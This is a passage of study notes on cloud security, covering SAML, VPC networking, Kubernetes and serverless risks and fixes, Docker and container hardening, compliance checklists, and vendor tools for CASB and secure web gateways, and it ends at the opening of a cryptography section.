		- Security Assertion Markup Language (SAML) is a widely used open-standard protocol for authentication and authorization between two communicating entities. It enables Single Sign-On (SSO), allowing users to access multiple applications or services with a single set of credentials. SAML can be implemented as a Software-as-a-Service (SaaS) solution or installed at both the Service Provider (SP) and Identity Provider (IdP) to facilitate federated authentication and authorization.
		- The SAML protocol consists of three key entities:
			- Client/User: An entity with a valid account that requests access to a service or resource through a web browser.
			- Service Provider (SP): A server hosting applications or services for users.
			- Identity Provider (IdP): A system component that stores user directories and manages authentication.
		- When SAML federation software is installed or configured, it establishes a trust relationship between the SP and IdP, enabling secure communication. When a user attempts to access a service or resource, they must be authenticated by the IdP. Upon receiving the user's service request, the SP sends a SAML authentication request to the IdP for validation.
		- The IdP then generates an XML-based SAML assertion, which consists of three key components:
			- Authentication Assertion: Describes the type of login attempt (e.g., password-based, two-factor authentication).
			- Attribute Assertion: Contains specific user details.
			- Authorization Assertion: Determines whether the user is granted or denied access to the service.
		- These XML-based assertions are then sent back to the SP. If the authentication is successful, the user gains access to the protected resources or services.
	- Cloud Network Security:
		- A cloud network is a virtual IT infrastructure managed by cloud service providers (CSPs), where network resources are supplied on demand in the form of private and public clouds. By creating a virtual environment within the cloud using an existing physical network, CSPs can perform network operations on the public cloud through individual client accounts. Cloud network security can be achieved in the following ways:
		- Virtual Private Cloud (VPC):
			- A VPC is a secure and isolated private cloud environment that exists within a public cloud. VPC clients can run applications, store data, and perform various tasks on a private network using their individual accounts, while the cloud provider manages the infrastructure. A VPC is generally independent of other VPCs under the same account, meaning one client cannot access another client’s VPC traffic. Clients can also create an IPv6 block and add multiple subnets within it. VPCs combine the scalability and efficiency of public cloud computing with the data isolation of private cloud computing. VPC resources are available on demand and can be expanded and configured as needed.
		- Public and Private Subnets:
			- VPC subnets can be either public or private. Virtual machines (VMs) in a public subnet can send data directly over the Internet, while VMs in a private subnet cannot. A public subnet includes an outbound route through an Internet Gateway (IGW), allowing unrestricted IPv4 and IPv6 traffic from the VPC. VMs in the public subnet can also receive inbound traffic via the IGW, provided that security groups and network access control lists (ACLs) allow it.
			- A private subnet, on the other hand, connects to the Internet through a Network Address Translation (NAT) gateway, which prevents direct inbound traffic from external sources, ensuring security. The NAT gateway itself handles the translation of private IP addresses to public ones. Private subnet connectivity can also be established using VPN services.
		- Transit Gateways:
			- A transit gateway is a network routing solution that facilitates communication between an on-premises network and multiple VPCs through a centralized hub. This approach simplifies network topology and eliminates complex peering connections. Communication through a transit gateway can be controlled using cloud-specific ACLs, based on port numbers and IP addresses. The centralized architecture enables administrators to gain full visibility into the network, even when connections are established via a software-defined wide area network (SD-WAN).
		- VPC Endpoints:
			- A VPC endpoint enables private communication between a VPC and other cloud services without requiring Internet access, external gateways, NAT solutions, VPN connections, or public IP addresses. This ensures that traffic remains within the organization's network. VPC endpoints are virtual networking components that are redundant, scalable, and highly available, allowing VMs in the VPC to interact with cloud services without bandwidth limitations or availability concerns.
			- There are two types of VPC endpoints:
				- Interface Endpoint: An elastic network interface (ENI) with a private IP address within a specified subnet. It serves as the entry point for traffic between a VPC and supported cloud services.
				- Gateway Load Balancer Endpoint: Also an ENI, this endpoint directs traffic to a service configured through a gateway load balancer, which performs security inspection before forwarding the traffic.
	- Cloud Security Controls:
		- Cloud security controls protect a cloud environment from vulnerabilities and minimize the impacts of cyberattacks. These controls include practices, procedures, guidelines, and policies enforced to secure cloud infrastructure. Below are a few examples of cloud security controls.
		- Cloud Application Security:
			- Cloud application security consists of rules, processes, policies, controls, and techniques that govern data exchange across collaborative cloud platforms such as Box, Google Workspace, Slack, and Microsoft Office 365. When employees or users store and transmit data via cloud platforms long-term, it is essential to implement a cloud-based solution known as a "safety net" as part of zero-trust security. Cloud application security applies specifically to the application layers of SaaS, IaaS, and PaaS.
			- Implementing cloud application security helps prevent exploits such as cross-site scripting (XSS), cross-site request forgery (CSRF), session hijacking, SQL injection, and weak authentication vulnerabilities.
		- High Availability Across Zones:
			- A cloud environment should include high availability zones to ensure application services remain operational during intentional or unintentional network downtimes. High availability is achieved by distributing servers across multiple zones while maintaining network consistency. This setup allows the system to handle failures in individual availability zones or the network without data loss. It also provides centralized management to monitor network operations and resource utilization.
			- A highly available cloud environment consists of two nodes: a master node and a secondary node. The master node operates in the primary availability zone, while the secondary node operates in a separate availability zone. This setup protects against service outages caused by disk failures, volume failures, network failures, and zone failures. Each node is independent and located in separate zones. If one node fails, its data is replicated in the other node, ensuring continuous access to all information. Additionally, nodes can be taken offline for upgrades while the other node maintains service availability.
		- Cloud Integration and Auditing:
			- Cloud integration involves connecting multiple cloud environments—whether public or hybrid—to allow administrators continuous access to and control over systems, services, data, and applications. It also facilitates integration between cloud and on-premises environments. Without cloud integration, administrators must perform each task manually, making the process time-consuming and prone to errors.
			- While risk indicators for on-premises networks are typically found in network or application logs, cloud-based risk indicators are derived from API logs. Therefore, all services should be integrated in accordance with defined security policies and guidelines, with audits conducted to ensure security compliance. Cloud integration mechanisms provide a comprehensive view of an organization’s data, improve connectivity, and facilitate risk assessment by aggregating all relevant indicators.
			- Cloud auditing involves analyzing the services offered by cloud providers and verifying compliance with privacy, security, and performance requirements. Cloud security audits must address challenges associated with both traditional and cloud infrastructure. Proper auditing ensures service availability under all conditions in an organized and comprehensive manner. It also enables automated data collection for systematic security and operational evaluations. Cloud auditing is a cost-effective approach that saves time for both large and small enterprises, as updates to security information can be dynamically applied when modifications are made.
		- Security Groups:
			- A security group is a fundamental security measure implemented in cloud infrastructure to protect virtual instances. It acts as a security layer for virtual machines, positioned between the Internet and the virtual instances, regulating inbound and outbound traffic. A properly configured security group helps prevent denial-of-service (DoS) attacks and unauthorized access to IT resources.
		- Instance Awareness:
			- The cloud-based kill chain model highlights the risk of attackers using fake cloud instances for command and control to exfiltrate data from cloud environments. Many security solutions—such as firewalls, gateways, and other cloud security tools—struggle to combat these threats because they cannot distinguish between legitimate and malicious cloud instances. Attackers exploit this limitation when targeting cloud networks.
			- To mitigate these risks, it is essential to use tools that can differentiate between legitimate cloud instances and fraudulent ones. Solutions that recognize and analyze cloud instances—such as Google Drive and OneDrive—are critical for protecting against cloud-based threats, including data exfiltration and SaaS phishing.
	- Kubernetes Vulnerabilities and Solutions:
		- The growing adoption of Kubernetes across various organizations, including major public cloud providers, has significantly increased the risk of critical security vulnerabilities. As a result, security professionals must proactively identify these vulnerabilities and implement robust security measures.
		- The table below outlines common Kubernetes vulnerabilities and their corresponding solutions:
			- No Certificate Revocation:
				- Ensure that nodes maintain a Certificate Revocation List (CRL) and verify certificates against it.
				- Require administrators to use Online Certificate Status Protocol (OCSP) stapling to revoke certificates via an OCSP server.
			- Unauthenticated HTTPS Connections:
				- Enforce authentication for all HTTPS connections by default.
				- Ensure all components use a CA maintained by the kube-apiserver.
				- Implement mutual TLS (mTLS) for all connections.
			- Exposed Bearer Tokens in Logs:
				- Remove bearer tokens from system logs and avoid logging authentication credentials.
				- Conduct code reviews to ensure sensitive data is not logged.
				- Implement logging filters to exclude sensitive data before storage.
			- Exposure of Sensitive Data via Environment Variables:
				- Avoid storing sensitive data directly in environment variables.
				- Use Kubernetes Secrets for managing sensitive information across system components.
			- Secrets at Rest Not Encrypted by Default:
				- Configure and document encryption settings to meet different security requirements.
				- Enable Kubernetes encryption providers to encrypt secrets at rest.
			- Non-Constant Time Password Comparison:
				- Use a secure constant-time comparison function, such as crypto.subtle.ConstantTimeCompare.
				- Deprecate basic authentication mechanisms in favor of more secure authentication options.
			- Hardcoded Credential Paths:
				- Implement configurable credential paths instead of hardcoding them.
				- Support cross-platform configurations through path abstraction and generalization.
			- Non-Atomic Log Rotation:
				- Use a copy-then-rename approach to prevent log loss during rotation.
				- Implement persistent logging mechanisms that append log data sequentially and generate new logs as needed.
			- No Back-Off Process for Scheduling:
				- Introduce a back-off mechanism in the kube-scheduler to prevent tight scheduling loops.
			- Lack of Non-Repudiation:
				- Implement secondary logging mechanisms for operations that require strict non-repudiation and auditing.
				- Ensure all authentication events are logged and retrievable from a centralized location within the cluster.
	- Serverless Security Risks and Solutions:
		- Serverless computing has gained popularity due to its remarkable features, such as zero administration, pay-per-use pricing, and self-scaling capabilities. While serverless technology offers numerous advantages, it also introduces new security risks that must be mitigated.
		- The table below outlines the top 10 serverless security risks and their corresponding solutions, based on OWASP recommendations.
		- A1 – Injection:
			- Do not trust or assume the validity of any input from external sources.
			- Use safe APIs and implement parameterized interfaces or object-relational mapping (ORM) tools.
			- Enforce application whitelisting where necessary.
			- Escape special characters using appropriate syntax in dynamic SQL queries.
			- Evaluate all system entry points and event types.
			- Run functions with the least privileges necessary to perform their tasks.
			- Protect functions during execution using runtime defense solutions.
		- A2 – Broken Authentication:
			- Use identity and access management (IAM) solutions provided by cloud service providers, such as AWS Cognito, AWS Single Sign-On, Azure Active Directory B2C, Azure App Service, and Google Firebase Authentication.
			- Implement strong authentication and access controls for externally exposed resources.
			- Use secure authentication mechanisms such as Federated Identity (SAML, OAuth2, Security Tokens) for internal resource authentication.
		- A3 – Sensitive Data Exposure:
			- Identify and classify sensitive data.
			- Minimize data storage—retain only essential information.
			- Encrypt data both in transit and at rest.
			- Enforce HTTPS for all API endpoints.
			- Utilize cloud service provider (CSP) tools for key management and encryption of stored data, secrets, and environment variables, both at runtime and during data transmission.
		- A4 – XML External Entities (XXE):
			- Whenever possible, use only the cloud provider’s software development kits (SDKs).
			- Conduct vulnerability scanning on supply chain libraries.
			- Test API calls for XXE vulnerabilities.
			- Always disable entity resolution.
		- A5 – Broken Access Control:
			- Apply the principle of least privilege when assigning permissions to functions.
			- Regularly review functions to identify excessive privileges.
			- Follow the best practices for identity and access management provided by cloud platforms, such as AWS IAM and Azure Identity Management.
		- A6 – Security Misconfiguration:
			- Use built-in cloud security tools, such as AWS Trusted Advisor, to detect publicly exposed resources.
			- Enforce strict access controls on cloud resources.
			- Identify functions with unlinked triggers.
			- Set the minimum required timeout for function execution.
			- Implement automated tools to detect security misconfigurations in serverless applications.
		- A7 – Cross-Site Scripting (XSS):
			- Encode all untrusted data before transmitting it to the client.
			- Use only well-established frameworks and security headers.
		- A8 – Insecure Deserialization:
			- Validate all serialized objects originating from untrusted sources.
			- Scan third-party libraries for deserialization vulnerabilities.
			- Monitor deserialization usage and exceptions to detect potential attacks.
		- A9 – Using Components with Known Vulnerabilities:
			- Continuously monitor third-party libraries and dependencies.
			- Deploy only signed packages and components from trusted sources.
			- Regularly check vulnerability databases, such as the Common Vulnerabilities and Exposures (CVE) database and the National Vulnerability Database (NVD).
			- Perform vulnerability scanning of third-party dependencies using tools like OWASP Dependency-Check and Dependency-Track.
		- A10 – Insufficient Logging and Monitoring:
			- Use cloud provider monitoring tools, such as Azure Monitor or AWS CloudTrail, to detect anomalous behavior.
			- Implement auditing and monitoring mechanisms for data sources outside the CSP’s scope.
	- Best Practices for Container Security:
		- Below are various best practices for securing the container environment:
		- Regularly monitor Common Vulnerabilities and Exposures (CVEs) in the container runtime and remediate any detected vulnerabilities.
		- Enable comprehensive logging and auditing to track access, changes to containers, and configuration modifications.
		- Configure applications to run as non-root users to prevent privilege escalation.
		- Set the host’s root file system to read-only mode to restrict write access and prevent malware injection attacks.
		- Minimize the use of third-party software and employ application security scanning tools to protect containers from malicious software.
		- Perform regular scanning of container images in the repository to identify vulnerabilities or misconfigurations.
		- Deploy application firewalls to enhance container security and prevent threats from entering the environment.
		- Ensure authenticated access to container registries, particularly those containing sensitive images and data.
		- Use minimal base images to reduce the attack surface and potential vulnerabilities.
		- Assign a separate database for each application to improve visibility and enhance data management.
		- Regularly update the host operating system and kernel with the latest security patches.
		- Configure orchestrators to deploy hosts separately based on their sensitivity level.
		- Automate compliance with container runtime configuration standards.
		- Continuously monitor images for embedded malware.
		- Store sensitive data externally and enable dynamic access at runtime.
		- Maintain a set of trusted registries and images, ensuring that only approved images are allowed to run in the container environment.
		- Use mandatory access control tools, such as SELinux and AppArmor, to protect applications and system services.
		- Implement real-time threat detection solutions and establish incident response capabilities to handle security incidents.
		- Use immutable containers to prevent modifications after deployment.
		- Change default user privileges from root to non-root and enforce permissions using Role-Based Access Control (RBAC).
		- Avoid storing sensitive information in code or configuration files.
		- Harden the host environment by removing non-essential native services and securing the entire stack.
		- Keep containers lightweight by minimizing unnecessary components.
		- Leverage Infrastructure-as-Code (IaC) to manage cloud resources and verify configurations before deployment.
	- Best Practices for Docker Security:
		- Below are best practices for securing a Docker environment:
		- Avoid exposing the Docker daemon socket as it is the main entry point for the Docker API.
		- Use only trusted Docker images to prevent the risk of backdoor injections by malicious users.
		- Regularly update the host OS and Docker to apply the latest security patches.
		- Limit container capabilities by granting only necessary permissions. Use --cap-drop all to remove all default capabilities, then add only the required ones.
		- Run containers with --security-opt=no-new-privileges to prevent privilege escalation attacks via setuid or setgid binaries.
		- Disable inter-container communication by setting --icc=false when running the Docker daemon. To allow specific container communication, use --link CONTAINER_NAME_or_ID:ALIAS.
		- Utilize Linux security modules like seccomp, AppArmor, and SELinux for fine-grained process control.
		- Restrict resource usage (CPU, memory, file descriptors, processes, and restarts) to mitigate DoS attacks.
		- Enable read-only mode on filesystems and volumes using the --read-only flag.
		- Set the Docker daemon log level to info, and avoid running it in debug mode.
		- Run containers as an unprivileged user instead of the default root user to prevent privilege escalation.
		- Minimize installed packages to reduce the attack surface.
		- Verify digital signatures of remote Docker images using Docker Content Trust (DCT).
		- Avoid storing sensitive data in environment variables; use Docker Secrets for secure encryption in transit.
		- Secure API endpoints with HTTPS when exposing the RESTful API.
		- Avoid the default bridge network for single-host applications using networking.
		- Store sensitive data in Docker volumes for better security, persistence, and encryption.
		- Enable TLS authentication for secure communication between the Docker client and daemon.
		- Use security tools like InSpec and Dive to detect vulnerabilities.
		- Restrict SSH access to administrators when managing container logs and performing administrative tasks.
		- Automate container labeling to maintain consistency and security.
		- Implement the HEALTHCHECK command in Dockerfiles to enhance container health monitoring.
		- Leverage Docker namespaces (PID, IPC, network, and user namespaces) to isolate containers.
		- Enable user namespaces to add an extra layer of isolation between the host and containers.
		- Enforce resource constraints with --memory and --cpus to limit CPU and memory usage per container.
		- Enable Docker Content Trust (DCT) to ensure image integrity and authenticity.
		- Specify a non-root user in Dockerfiles using the USER directive to enhance security.
	- Best Practices for Kubernetes Security:
		- Below are various best practices for securing the Kubernetes environment:
		- Ensure proper validation of file contents and their paths at every stage of processing.
		- Implement configuration methods for credential paths instead of relying on hardcoded paths.
		- Explicitly raise errors after each step of a compound operation.
		- Use the copy-then-rename method for log rotation to ensure that logs are not lost when restarting the kubelet.
		- Ensure secure and reliable handling of JSON data by using well-tested JSON libraries and appropriate type structures in applications interacting with Kubernetes APIs.
		- Never use compound shell commands without proper validation, as they can affect the system state.
		- Explicitly check the returned error value of os.Readlink /proc/<pid>/exe to determine if a PID belongs to a kernel process.
		- Use centralized libraries for common tasks and standardized parsing functions, such as ParsePort, across the codebase to improve code readability.
		- Use persistent logs instead of log rotation, allowing logs to be written in linear order and new logs to be created when rotation is required.
		- Use a single encoding format for all configuration tasks to support centralized validation.
		- Limit the size of manifest files to prevent out-of-memory errors in the kubelet.
		- Deploy kube-apiserver instances that maintain Certificate Revocation Lists (CRLs) to validate presented certificates.
		- Use key management services for secret data encryption, avoiding AES-Galois/Counter Mode (GCM) or Cipher Block Chaining (CBC) for encryption.
		- Authenticate all HTTPS connections by default to ensure certificates are issued by a trusted Certificate Authority (CA) and to prevent Man-in-the-Middle (MITM) attacks.
		- Avoid using legacy SSH tunnels, as they do not properly validate server IP addresses.
		- Use Online Certificate Status Protocol (OCSP) stapling to verify the revocation status of certificates.
		- Enable secure TLS configurations by default in both development and production environments to reduce vulnerabilities caused by misconfiguration.
		- Implement Access Control Lists (ACLs) to manage file access permissions and prevent unauthorized access.
		- Use log filtering to remove sensitive information, such as bearer tokens and basic authentication credentials, from log data.
		- Enable comprehensive logging and monitoring for Kubernetes clusters using tools such as Prometheus, Grafana, and the ELK Stack.
		- Implement policy management tools such as Open Policy Agent (OPA) or Kyverno to enforce security policies across the Kubernetes cluster.
		- Regularly patch and update Kubernetes components and dependencies to the latest versions.
		- Configure resource quotas and limits to prevent resource exhaustion.
		- Utilize network policies and service meshes to control and secure pod-to-pod communication.
		- Regularly review and rotate Kubernetes secrets to minimize the risk of credential compromise.
	- Best Practices for Serverless Security:
		- Outlined below are key best practices for securing a serverless computing environment:
		- Minimize permissions during development to reduce the attack surface.
		- Regularly monitor function layers to detect malicious code injection attempts and other web server attacks.
		- Utilize third-party security tools to enhance visibility and control.
		- Patch and update function dependencies and applications frequently.
		- Use security scanning tools like Snyk to identify known vulnerabilities in serverless applications.
		- Maintain isolated function perimeters and avoid reliance on function access and invocation order.
		- Sanitize event inputs properly to prevent code injection attacks.
		- Leverage security libraries that enforce least-privilege access and restrict unauthorized resource access at runtime.
		- Deploy functions with minimal granularity to reduce implicit global roles and enhance security.
		- Apply strict data validation on schemas and data transfer objects instead of relying on serialization and deserialization.
		- Utilize API Gateway features for input filtering, traffic throttling, rate limiting, and protection against DDoS attacks.
		- Enforce logging and monitoring of function events with verbose and secure logs for better observability.
		- Follow secure coding practices and conduct code reviews to address vulnerabilities; additionally, use shared security libraries.
		- Use TLS/HTTPS for secure communication and encrypt credentials with strong cryptographic algorithms.
		- Verify SSL certificates to authenticate remote identities and terminate communication if verification fails.
		- Enable signed requests for cloud vendors to protect data in transit and prevent HTTP replay attacks.
		- Store sensitive information securely using secret management solutions that support runtime access and key rotation.
		- Set execution timeouts to limit how long serverless functions run.
		- Implement network security controls such as Virtual Private Cloud (VPC) configurations to restrict access.
		- Secure all triggers (e.g., API Gateway, S3, DynamoDB) by ensuring they are configured correctly and accessible only to authorized entities.
	- Zero Trust Networks:
		- The Zero Trust model is a security framework that assumes, by default, that every user attempting to access the network is untrusted. It verifies every incoming connection before granting access. This approach strictly follows the principle: “Trust no one; always verify before granting access or providing cloud services.” This does not imply that company employees are inherently untrustworthy; rather, the network can be compromised, or an unauthorized person may attempt to gain access. This model ensures that no user or employee can access the network without verification. It also allows organizations to enforce policies that limit access to only the resources necessary for an employee’s specific role.
		- Representation of Zero Trust Network:
			- As shown in the figure, the cloud control plane is a central system that manages and coordinates the data plane (which includes all other network components). The control plane grants network access only to legitimate and verified users or devices. Fine-grained policies are enforced at this layer based on factors such as the user’s role in the organization, the time of access, and the device type. To access highly secure internet resources, users must undergo stronger authentication. Once the control plane approves an access request, the data plane is configured to accept traffic only from that specific client.
			- The core objectives of implementing a Zero Trust model are:
				- Ensuring a secure method for accessing resources.
				- Enforcing strict access controls based on identity and risk.
				- Continuously monitoring network traffic for anomalies.
			- Zero Trust can be integrated with various security techniques, including encryption, multi-factor authentication (MFA), and privileged access management (PAM). This model also employs micro-segmentation, which divides the network into smaller, isolated segments to restrict access to specific areas. In the event of a security breach, micro-segmentation helps contain threats and prevents further exploitation of the network.
	- Organization/Provider Cloud Security Compliance Checklist:
		- The following tables provide checklists to determine whether the security team, the broader organization, and any proposed cloud provider can ensure cloud security.
		- Checklist to Assess the Readiness of the Cloud Service Provider (CSP):
			- Are the security team members formally trained in cloud technologies?
			- Do the organization’s security policies account for cloud infrastructure?
			- Has the security team been involved in implementing cloud infrastructure?
			- Has the organization defined security assessment procedures for cloud infrastructure?
			- Has the organization ever been audited for cloud security threats?
			- Will the organization’s cloud adoption comply with the security standards it follows?
			- Has security governance been updated to include cloud considerations?
			- Does the team have adequate resources to implement and secure cloud infrastructure?
		- Operations:
			- Are regulatory compliance reports, audit reports, and other security-related documents available from the provider?
			- Are the organization’s incident handling and business continuity policies designed with cloud security considerations?
			- Are the cloud service provider’s compliance and audit reports accessible to the organization?
			- Does the CSP’s SLA address incident handling and business continuity concerns?
			- Does the CSP have clear policies and procedures for handling digital evidence in the cloud environment?
			- Is the CSP compliant with relevant industry standards?
			- Does the CSP have skilled and sufficient staff for incident resolution and configuration management?
			- Has the CSP defined procedures to support the organization in a multi-tenant incident scenario?
			- Does using a cloud provider provide the organization with an environmental advantage?
			- Does the organization know which application or database stores each data entity?
			- Is the cloud-based application disaster-tolerant (i.e., can it recover from internal or external disruptions)?
			- Are all personnel appropriately vetted, monitored, and supervised?
			- Does the CSP offer flexibility in service relocation and switchovers?
			- Has the CSP implemented perimeter security controls (e.g., IDS, firewalls) and does it provide regular activity logs to the organization?
			- Does the CSP provide reasonable assurance of service quality and availability?
			- Is it easy to securely integrate cloud-based applications at runtime and upon contract termination?
			- Does the CSP offer 24/7 support for cloud operations and security-related issues?
			- Do procurement processes include cloud security requirements?
			- Does the CSP frequently perform vulnerability assessments to identify security gaps and apply necessary patches?
		- Technology:
			- Are appropriate access controls in place (e.g., federated single sign-on) to regulate user access to cloud applications?
			- Is data separation maintained between the organization and customer information at runtime and during backup, including data disposal?
			- Has the organization addressed backup, recovery, archiving, and decommissioning of cloud-stored data?
			- Are authentication, authorization, and key management mechanisms implemented in the cloud environment?
			- Are measures in place to manage network congestion, misconfiguration, misconnection, and lack of resource isolation that could impact security and service availability?
			- Has the organization implemented sufficient security controls on client devices used to access the cloud?
			- Are all cloud-based systems, infrastructure, and physical locations adequately protected?
			- Are the network designs sufficiently secure for the organization’s cloud adoption strategy?
		- Management:
			- Is everyone aware of their cloud security responsibilities?
			- Is there a mechanism for assessing the security of a cloud service?
			- Does business governance mitigate security risks from cloud-based “shadow IT”?
			- Does the organization know the jurisdictions where its data may reside?
			- Is there a framework for managing cloud-related risks?
			- Does the organization understand the data architecture required for secure cloud operations?
			- Can the organization ensure end-to-end service continuity across multiple cloud providers?
			- Does the CSP comply with all relevant industry regulations (e.g., the UK’s Data Protection Act)?
			- Does the compliance function understand the specific regulatory issues associated with the organization's cloud adoption?
	- International Cloud Security Organizations:
		- Several international cloud security organizations are dedicated to assisting security professionals by promoting best practices, raising security awareness, and establishing strong security policies. These efforts enhance cybersecurity resilience and foster a trusted cloud ecosystem. Below is an international organization that informs and guides industries and security professionals about evolving threats while providing solutions to protect cloud infrastructure from cyberattacks.
		- Cloud Security Alliance (CSA) (cloudsecurityalliance.org):
			- The Cloud Security Alliance (CSA) is a nonprofit global organization that raises awareness and promotes best practices and security policies to enhance cloud security. CSA provides education and knowledge on cloud computing and helps secure various computing environments. It connects industry experts, governments, and corporate members to support cloud-based research, education, certification programs, and security solutions.
	- Shadow Cloud Asset Discovery Tools:
		- Shadow cloud assets refer to cloud applications or services used within a corporate environment without the IT department’s knowledge. These assets can introduce security risks such as data loss, account abuse, and malware distribution. To mitigate these threats, organizations can leverage tools like Securiti, CloudEagle, and Microsoft Defender for Cloud Apps, which provide comprehensive visibility into application usage. These tools enable administrators to monitor and audit activities within the organization’s cloud network.
		- Securiti (securiti.ai): Securiti is an AI-powered security tool designed to detect and monitor shadow cloud assets, native data resources, and unmanaged data repositories that pose privacy risks in multi-cloud environments. It offers automated workflows for data classification, risk assessment, and compliance reporting, helping businesses meet regulatory requirements while securing their data.
		- CloudEagle (www.cloudeagle.ai)
		- Microsoft Defender for Cloud Apps (learn.microsoft.com)
		- FireCompass (www.firecompass.com)
		- Data Theorem (www.datatheorem.com)
		- BetterCloud (www.bettercloud.com)
	- Cloud Security Tools:
		- Migrating to the cloud offers significant benefits, but security remains a primary concern. Fortunately, various security services and tools are available to automate cloud penetration testing, ensuring the confidentiality, integrity, and security of data hosted in the cloud.
		- Some tools for securing cloud environments include the following:
			- Qualys Cloud Platform (www.qualys.com): The Qualys Cloud Platform is a comprehensive IT security solution that provides continuous, always-on assessment of global security and compliance postures. It offers visibility across all IT assets, regardless of their location. The platform includes sensors that ensure continuous monitoring, allowing real-time analysis of cloud data. It can immediately respond to threats, perform active vulnerability assessments (including Internet Control Message Protocol (ICMP) timestamp requests), and visualize results in a unified dashboard with AssetView.
			- Prisma Cloud (www.paloaltonetworks.com)
			- Netskope One (www.netskope.com)
			- Lookout CipherCloud (www.lookout.com)
			- Trend Micro Deep Security (www.trendmicro.com)
			- Data-Aware Cloud Security (www.skyhighsecurity.com)
	- Container Security Tools:
		- As containers are continuously deployed across cloud environments, they require robust security measures. Security professionals use tools such as Aqua, Sysdig Falco, and Anchore to protect containers from various security threats.
		- Aqua (www.aquasec.com): Aqua scans container images, virtual machines (VMs), and serverless functions for known vulnerabilities, embedded secrets, configuration and permission issues, malware, and open-source licensing risks. It prevents untrusted code from running and ensures that functions, containers, and VMs remain immutable, preventing unauthorized changes to running workloads. Additionally, Aqua integrates seamlessly into existing infrastructure, facilitating DevSecOps collaboration, logging and reporting, incident response, and event monitoring.
		- Sysdig Falco (sysdig.com)
		- Anchore (anchore.com)
		- Snyk Container (snyk.io)
		- Lacework (www.lacework.com)
		- Tenable Cloud Security (www.tenable.com)
	- Kubernetes Security Tools:
		- As Kubernetes is the de facto container deployment and management tool, its workloads must be regularly monitored and secured using appropriate security measures. Security professionals rely on tools such as Advanced Cluster Security for Kubernetes, Aqua Kubernetes Security, and Kyverno to safeguard Kubernetes environments.
		- Advanced Cluster Security for Kubernetes (www.redhat.com): Advanced Cluster Security (ACS) for Kubernetes is a comprehensive solution designed to enhance the security of Kubernetes environments. It assists in building, deploying, and running cloud-native applications while providing a robust set of tools and features focused on visibility, compliance, threat detection, and risk management. This ensures comprehensive protection for cloud-native workloads.
		- Aqua Kubernetes Security (www.aquasec.com)
		- Kyverno (github.com)
		- Kubeaudit (github.com)
		- Sumo Logic (www.sumologic.com)
		- Kubespace (kubescape.io)
	- Serverless Application Security Solutions:
		- Serverless cloud computing has experienced significant growth in recent years. However, the evolving cloud-based infrastructure also introduces various security risks, such as function event-data injection, broken authentication, and over-privileged function permissions. Therefore, conducting regular security inspections is essential.
		- Security professionals utilize various tools, such as Dashbird, CloudGuard, and Prisma Cloud, to perform security assessments on serverless infrastructures.
		- Dashbird (dashbird.io): Dashbird is a comprehensive observability and monitoring platform designed for serverless applications. It provides real-time monitoring, error detection, and end-to-end visibility across various cloud resources, enabling security professionals to identify and resolve issues efficiently. By integrating seamlessly with cloud environments, Dashbird helps maintain high performance, security, and operational excellence for serverless workloads.
		- CloudGuard (www.checkpoint.com)
		- Datadog Serverless Monitoring (www.datadoghq.com)
		- Prisma Cloud (www.paloaltonetworks.com)
		- lumigo (lumigo.io)
		- sysdig (sysdig.com)
	- Cloud Access Security Broker (CASB):
		- Cloud Access Security Brokers (CASBs) are on-premises or cloud-hosted solutions responsible for enforcing security, compliance, and governance policies in cloud applications. A CASB is positioned between an organization's on-premises infrastructure and a cloud provider's infrastructure. It acts as a gatekeeper, enabling organizations to extend their security policies beyond their own infrastructure.
		- Features of CASB:
			- Visibility into Cloud Usage: Identifies shadow IT cloud services and provides visibility into user activities within approved cloud applications.
			- Data Security: Enforces data-centric security measures, including encryption, tokenization, access control, and information rights management.
			- Threat Protection: Detects and responds to malicious insider threats, privileged user threats, and compromised accounts.
			- Compliance: Identifies critical data in the cloud and enforces Data Loss Prevention (DLP) policies to meet data residency and compliance requirements.
		- CASB Capabilities:
			- CASBs offer the following functionalities:
			- Firewalls to detect malware and prevent it from infiltrating the enterprise network.
			- Authentication to validate user credentials, ensuring that only authorized users can access organizational resources.
			- Web Application Firewalls (WAFs) to prevent malware from breaching security at the application level rather than at the network level.
			- DLP to prevent users from transferring critical information outside the organization.
		- How CASBs Work:
			- A CASB functions by:
			- Ensuring network traffic between on-premises devices and the cloud provider complies with organizational security policies.
			- Providing insights into cloud application usage across cloud platforms and identifying unauthorized use.
			- Utilizing auto-discovery to identify:
				- Cloud applications in use
				- High-risk applications
				- High-risk users
			- Enforcing security access controls such as encryption and device profiling.
			- Offering services such as credential mapping when Single Sign-On (SSO) is unavailable.
		- CASB Solutions:
			- Forcepoint ONE CASB (www.forcepoint.com):
				- Forcepoint ONE CASB delivers comprehensive security for all cloud applications.
				- Key features include:
					- Cloud application discovery
					- Cloud application risk scoring
					- Data classification
					- User and application governance
					- Real-time activity monitoring and analytics
					- Automatic anomaly detection
					- Data loss prevention
					- Integration with third-party solutions
			- CloudCodes (www.cloudcodes.com)
			- Cisco Cloudlock (www.cisco.com)
			- Zscaler CASB (www.zscaler.com)
			- Proofpoint Cloud App Security Broker (CASB) (www.proofpoint.com)
			- FortiCASB (www.fortinet.com)
	- Next-Generation Secure Web Gateway (NG SWG):
		- A Next-Generation Secure Web Gateway (NG SWG) is a cloud-based security solution that protects an organization’s network from cloud-based threats, malware infections, and online data theft. It also enables clients to securely access cloud services. NG SWG detects cloud-based threats in advance, prioritizes them based on risk levels, and manages applications used by different users and clients.
		- Below are some of its key cloud visibility capabilities and features:
			- URL filtering
			- Certificate (TLS/SSL) decryption
			- Cloud Access Security Broker (CASB) operations, including identifying, decrypting, analyzing, and securing traffic
			- Advanced Threat Protection (ATP) with sandboxing and machine learning (ML)-based anomaly detection
			- Support for Data Loss Prevention (DLP) for web traffic and cloud applications
			- Qualitative metadata contexts for web inspection and reporting
		- NG SWG Solutions:
			- Netskope Next Gen Secure Web Gateway (SWG) (www.netskope.com)
			- Cloudflare Gateway (www.cloudflare.com)
			- Skyhigh Secure Web Gateway (SWG) (www.skyhighsecurity.com)
			- Menlo Secure Web Gateway (SWG) (www.menlosecurity.com)
			- McAfee MVISION UCE (www.mcafee.com)


--------------------------------------------------

# Cryptography

- Cryptography Concepts and Encryption Algorithms:
	- Cryptography secures transactions, communications, and other processes in the digital world. Encryption is the process of converting readable plaintext into unreadable ciphertext using complex algorithms that transform data into blocks or streams of seemingly random alphanumeric characters. This section explores cryptography and its key concepts, providing a foundation for understanding the advanced topics covered later in this module. It also examines ciphers and various encryption algorithms, including DES, AES, RC4, RC5, RC6, DSA, RSA, MD5, and SHA.
	- Cryptography:
		- The term "cryptography" originates from the Greek words kryptos, meaning "concealed, hidden, veiled, secret, or mysterious," and graphia, meaning "writing." Thus, cryptography is "the art of secret writing."
